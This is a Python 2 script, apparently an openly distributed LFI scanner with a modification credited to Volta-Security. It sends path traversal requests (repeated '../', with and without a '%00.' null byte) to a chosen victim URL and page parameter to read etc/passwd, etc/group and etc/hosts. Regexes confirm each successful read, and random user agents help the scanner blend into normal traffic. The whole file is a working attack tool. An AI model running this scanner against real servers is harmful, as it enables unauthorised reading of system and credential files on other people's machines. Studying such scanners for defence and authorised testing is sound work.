
#!/usr/bin/env  python26

import optparse
import sys
import urllib2, socket
import random
import re

#
# Banner aLFI
banner = """
	#     #                                                                                    
	##   ##  ####  #####  # ###### # ###### #####                                              
	# # # # #    # #    # # #      # #      #    #                                             
	#  #  # #    # #    # # #####  # #####  #    #                                             
	#     # #    # #    # # #      # #      #    #                                             
	#     # #    # #    # # #      # #      #    #                                             
	#     #  ####  #####  # #      # ###### #####                                              
	######                                                                                     
	#     # #   #                                                                              
	#     #  # #                                                                               
	######    #                                                                                
	#     #   #                                                                                
	#     #   #                                                                                
	######    #                                                                                
	#     #                                   #####                                            
	#     #  ####  #      #####   ##         #     # ######  ####  #    # #####  # ##### #   # 
	#     # #    # #        #    #  #        #       #      #    # #    # #    # #   #    # #  
	#     # #    # #        #   #    # #####  #####  #####  #      #    # #    # #   #     #   
	 #   #  #    # #        #   ######             # #      #      #    # #####  #   #     #   
	  # #   #    # #        #   #    #       #     # #      #    # #    # #   #  #   #     #   
	   #     ####  ######   #   #    #        #####  ######  ####   ####  #    # #   #     #   





                  $$\       $$$$$$$$\ $$$$$$\\
                  $$ |      $$  _____|\_$$  _|
         $$$$$$\  $$ |      $$ |        $$ |
         \____$$\ $$ |      $$$$$\      $$ |
         $$$$$$$ |$$ |      $$  __|     $$ |
        $$  __$$ |$$ |      $$ |        $$ |
        \$$$$$$$ |$$$$$$$$\ $$ |      $$$$$$\\
         \_______|\________|\__|      \______|



         $$$$$$\\
        $$  __$$\\
        $$ /  \__| $$$$$$$\ $$$$$$\  $$$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\\
        \$$$$$$\  $$  _____|\____$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\\
         \____$$\ $$ /      $$$$$$$ |$$ |  $$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|
        $$\   $$ |$$ |     $$  __$$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |
        \$$$$$$  |\$$$$$$$\\$$$$$$$ |$$ |  $$ |$$ |  $$ |\$$$$$$$\ $$ |
         \______/  \_______|\_______|\__|  \__|\__|  \__| \_______|\__|

                                                                 An0th3r LFI sC4Nn3r v1.0

                                Written by:

                              Claudio Viviani

                           http://www.homelab.it

                              info@homelab.it
                           homelabit@protonmail.ch

                      https://www.facebook.com/homelabit
                      https://twitter.com/homelabit
                      https://plus.google.com/+HomelabIt1/
            https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww


	!!!Modified by Volta-Security Feb 2017 to include Null Byte Checking!!!
"""


commandList = optparse.OptionParser('usage: %prog -u URL -t TARGET_PAGE [-p PORT] [--timeout sec] [-r, --random-agent]\n')
commandList.add_option('-u', '--url',
                  action="store",
                  dest="url",
                  help="Insert URL: http[s]://www.victim.com",
                  )
commandList.add_option('-t', '--target',
                  action="store",
                  dest="target",
                  help="Insert page: The name of the page to be scanned (Ex. index.php?page=)",
                  )
commandList.add_option('-p', '--port',
                  action="store",
                  dest="port",
                  default=0,
                  type="int",
                  help="[Insert Port Number] - Default 80 or 443",
                  )
commandList.add_option('--timeout',
                  action="store",
                  dest="timeout",
                  default=10,
                  type="int",
                  help="[Timeout Value] - Default 10",
                  )
commandList.add_option('-r', '--random-agent',
                  action="store_true",
                  dest="randomagent",
                  default=False,
                  help="[Set random UserAgent]",
                  )


options, remainder = commandList.parse_args()


# Usage:
if ( not options.url or not options.target):
        print(banner)
        print
        commandList.print_help()
        sys.exit(1)
#
# UserAgent list
# Top UA 18/08/2014
# http://techblog.willshouse.com/2012/01/03/most-common-user-agents/
def randomAgentGen():

 userAgent =    ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/538.46 (KHTML, like Gecko) Version/8.0 Safari/538.46',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10',
                'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
                'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
                'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9',
                'Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
                'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']

 if RANDOMAGENT:
         UA = random.choice(userAgent)
         headers = { 'User-Agent' : UA }
 else:
         UA = "Python-urllib/%s.%s" % sys.version_info[:2]
         headers = { 'User-Agent' : UA }

 return headers

# File check list + regexp
CHECK = dict()
CHECK['etc/passwd'] = '^([a-z]*:[^:]*:[0-9]*:[0-9]*:[^:]*:/[^:]*:/[^:]*)$'
CHECK['etc/group'] = '^([a-z]*:[^:]*:[0-9]*:[0-9]*)$'
CHECK['etc/hosts'] = '^(((([1]?\d)?\d|2[0-4]\d|25[0-5])\.){3}(([1]?\d)?\d|2[0-4]\d|25[0-5]))|([\da-fA-F]{1,4}(\:[\da-fA-F]{1,4}){7})|(([\da-fA-F]{1,4}:){0,5}::([\da-fA-F]{1,4}:){0,5}[\da-fA-F]{1,4})'

RANDOMAGENT = options.randomagent
TIMEOUT = options.timeout
URL = options.url
PORT = options.port
TARGET = options.target

if URL[0:8] == "https://":
        PROTO = URL[0:8]
        URL = URL[8:]
        if URL.endswith("/"):
                URL = URL.replace("/","")
        if PORT == 0:
                PORT = 443

elif URL[0:7] == "http://":
        PROTO = URL[0:7]
        URL = URL[7:]
        if URL.endswith("/"):
                URL = URL.replace("/","")
        if PORT == 0:
                PORT = 80
else:
        PROTO = "http://"
        URL = options.url
        if URL.endswith("/"):
                URL = URL.replace("/","")
        if PORT == 0:
                PORT = 80

try:
        #URL = socket.gethostbyname( URL )
        socket.gethostbyname( URL )

except socket.gaierror:
        #could not resolve
        print 'Hostname could not be resolved. Exiting'
        sys.exit()

headers = randomAgentGen()

print(banner)
print
print('[*] URL:\t'+PROTO+URL)
print('[*] TARGET:\t'+TARGET)
print('[*] PORT:\t'+str(PORT))
print

found = 0

for  fileCheck, fileRegexp in CHECK.items():
        FILE = fileCheck
        REGEXP = fileRegexp
        checkValidRegexp = re.compile(REGEXP, re.IGNORECASE)

        for scanLFI in range(1, 11):

                PATHTRAV = "../"

                PATHTRAV = PATHTRAV * scanLFI

                try:
                        req = urllib2.Request(PROTO+URL+':'+str(PORT)+'/'+TARGET+PATHTRAV+FILE, None, headers)
                        connection = urllib2.urlopen(req, None, TIMEOUT)
                        response = connection.readlines()
                        getcode = connection.getcode()

                        sentinel = 0
                        for checkResponse in response:
                                #if (getcode == 200 and response != ""):
                                if (getcode == 200 and checkValidRegexp.match(checkResponse)):
                                        sentinel = sentinel + 1

                        if sentinel > 1:
                                print('[+] '+PROTO+URL+':'+str(PORT)+'/'+TARGET+PATHTRAV+FILE+'\t <--- FOUND')
                                found = found + 1
                  
                # HTTP error - 4xx, 5xx
                except urllib2.HTTPError:
                        print('[+] '+PROTO+URL+':'+str(PORT)+'/'+TARGET+PATHTRAV+FILE)

                # Connection error - Connection refused, No route to host
                except urllib2.URLError:
                        print('Can\'t connect to host: '+PROTO+URL+' on port '+str(PORT))
                        #sys.exit()

if found < 1:
        print
        print('[+] Nothing found trying null bytes')

	founds = 0

	try:

		for  fileCheck, fileRegexp in CHECK.items():
			FILE = fileCheck
			REGEXP = fileRegexp
			checkValidRegexp = re.compile(REGEXP, re.IGNORECASE)

			for scanLFI in range(1, 11):

				PATHTRAV = "../"

				PATHTRAV = PATHTRAV * scanLFI

				NULL = "%00."

				try:
				        req = urllib2.Request(PROTO+URL+':'+str(PORT)+'/'+TARGET+PATHTRAV+FILE+NULL, None, headers)
				        connection = urllib2.urlopen(req, None, TIMEOUT)
				        response = connection.readlines()
				        getcode = connection.getcode()

				        sentinels = 0
				        for checkResponse in response:
				                #if (getcode == 200 and response != ""):
				                if (getcode == 200 and checkValidRegexp.match(checkResponse)):
				                        sentinels = sentinels + 1

				        if sentinels > 1:
				                print('[+] '+PROTO+URL+':'+str(PORT)+'/'+TARGET+PATHTRAV+FILE+NULL+'\t <--- FOUND')
				                founds = founds + 1
				        
				# HTTP error - 4xx, 5xx
				except urllib2.HTTPError:
				        print('[+] '+PROTO+URL+':'+str(PORT)+'/'+TARGET+PATHTRAV+FILE+NULL)

				# Connection error - Connection refused, No route to host
				except urllib2.URLError:
				        print('Can\'t connect to host: '+PROTO+URL+' on port '+str(PORT))
					sys.exit()
	except urllib2.HTTPError:
    		print 'error/exception'	
	        
		if founds < 1:
			print
			print('[+] Nothing found BYE!!')
